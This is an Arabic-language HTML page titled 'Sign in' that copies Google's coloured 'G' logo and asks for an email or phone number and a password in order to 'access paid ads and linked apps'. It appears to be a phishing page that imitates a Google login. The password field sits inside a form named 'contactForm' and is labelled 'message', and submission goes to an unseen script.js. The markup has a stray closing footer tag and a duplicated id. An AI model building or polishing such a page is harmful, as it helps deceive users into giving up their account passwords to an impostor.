<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <main class="login-wrapper">
      <div class="login-card">
        <!-- الجزء العلوي: الشعار والعناوين -->
        <header class="card-header">
          <div class="brand-mark">
            <svg
              viewBox="0 0 24 24"
              width="48"
              height="48"
              xmlns="http://www.w3.org/2000/svg">
              <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4" />
              <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853" />
              <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
                fill="#FBBC05" />
              <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
                fill="#EA4335" />
            </svg>
          </div>

          <h1 class="title">تسجيل الدخول</h1>
          <p class="subtitle">
            استخدم حسابك للوصول إلى الإعلانات المدفوعه والتطبيقات المرتبطة.
            <a href="#" class="info-link">مزيد من المعلومات</a>
          </p>
        </header>

        <!-- نموذج البيانات: يحتوي على حقلي الإدخال -->
        <form id="contactForm" class="auth-form">
          <!-- حقل اسم المستخدم أو الإيميل -->
          <div class="input-field">
            <input
              type="email"
              id="email"
              placeholder="البريد الإلكتروني أو الهاتف"
              required
              autocomplete="username" />
          </div>

          <div class="helper-text">
            <a href="#" class="link">هل نسيت البريد الإلكتروني؟</a>
          </div>

          <!-- حقل كلمة المرور المطلوب إضافته -->
          <div class="input-field password-field">
            <input
              type="password"
              id="message"
              placeholder="أدخل كلمة المرور"
              required
              autocomplete="current-password" />
          </div>

          <div class="helper-text">
            <a href="#" class="link">هل نسيت كلمة المرور؟</a>
          </div>
        </form>

        <!-- الجزء السفلي: أزرار التفاعل الموزعة يمين ويسار -->
        

 <div class="actions">
   <button type="button" class="back-button" onclick="history.back()" > Back </button>
    <button type="submit" id="sendButton" class="send-button" > 
      <span id="sendButton">التالي</span> 
      <span id="loader" class="loader"></span> 
    </button>
   </div> 
   <div id="status" class="status"></div>
        </footer>
      </div>
    </main>
    <script src="script.js"></script>
  </body>
</html>
